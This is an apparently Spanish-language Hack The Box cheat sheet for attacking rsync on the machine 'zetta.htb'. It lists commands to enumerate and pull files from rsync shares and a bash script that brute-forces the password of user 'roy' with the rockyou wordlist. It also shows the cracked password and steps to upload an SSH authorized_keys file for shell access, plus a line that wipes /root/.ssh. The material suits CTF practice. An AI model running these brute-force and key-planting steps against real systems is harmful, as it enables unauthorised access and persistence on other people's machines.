
### PROBAR CONECTIVIDAD
```shell
# En este caso se hara por Ipv6, es un poco mas complejo pero contemplaremos las dos formas.
[IPV6]
❯ sudo vi /etc/hosts
11   │ dead:beef::57a:71c:23:77a zetta.htb
❯ rsync rsync://zetta.htb:8730 --> En este caso es el 8730 en vez del 873

[IPV4]
❯ rsync rsync://0.0.0.0:8730 --> En este caso es el 8730 en vez del 873
```

### CONECTAR A UN DIRECTORIO
```shell
❯ rsync rsync://zetta.htb:8730/FOLDER
	#PUEDE HABER DIRECTORIOS OCULTOS, NO HACER CASO A LOS QUE SALEN, PROBARLO TODO
```

### DESCARGAR CONTENIDO DE UN DIRECTORIO
```shell
❯ rsync -r rsync://zetta.htb:8730/etc .
```

### ARCHIVO DE CONFIGURACIÓN
```shell
/etc/rsyncd.conf
```

**RSYNC BRUTEFORCE CREDS**
```bash
#!/bin/bash
function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    tput cnorm; exit 1
}
# Ctrl+C
trap ctrl_c INT
tput civis
for password in $(cat /usr/share/wordlists/rockyou.txt); do
    sshpass -p "$password" rsync -r rsync://roy@zetta.htb:8730/home_roy &>/dev/null
    if [ "$(echo $?)" == "0" ]; then
        echo -e "\n[+] La password correcta es $password"
        tput cnorm; exit 0
    fi
done
tput cnorm
```

### DESCARGARSE CONTENIDO DE UN DIRECTORIO CON CREDENCIALES
```shell
❯ sshpass -p "computer" rsync -r rsync://roy@zetta.htb:8730/home_roy .
```

### CREAR CLAVE SSH
```shell
#CREACIÓN DE LAS CLAVES
❯ mkdir .ssh
❯ cd .ssh
❯ sudo rm -r /root/.ssh/*
❯ sudo ssh-keygen
	Enter file in which to save the key (/root/.ssh/id_rsa): 
	Enter passphrase (empty for no passphrase): 
	Enter same passphrase again: 
❯ sudo cat /root/.ssh/id_rsa.pub > authorized_keys

[CARGAR LAS CLAVES.]
❯ sshpass -p "computer" rsync -r .ssh rsync://roy@zetta.htb:8730/home_roy
❯ ssh roy@10.10.10.156
```
